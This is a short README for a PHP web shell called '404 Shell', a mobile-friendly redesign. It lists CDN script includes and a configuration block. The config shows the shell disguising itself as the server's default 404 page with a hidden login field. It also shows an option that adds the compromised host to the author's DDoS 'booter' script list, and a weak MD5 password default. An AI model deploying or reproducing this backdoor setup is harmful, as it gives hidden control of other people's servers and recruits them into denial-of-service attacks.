## Responsive 404 Shell ( Redesign by Codelyfe )

## Mobile Friendly 

## Original git ( https://github.com/KyleBoyer/404Shell )


## CDN
```
<!--BOOTSTRAP & JQUERY CDN-->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
<!--BOOTSTRAP & JQUERY CDN-->
```


## Change password
```
<?php
$pass               = md5("pw");
$version            = 3.71;
$adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
$checkforupdates    = false;
$helpsupportbooter  = false; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
$checkforupdatesurl = "";
$mtime     = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
?>
```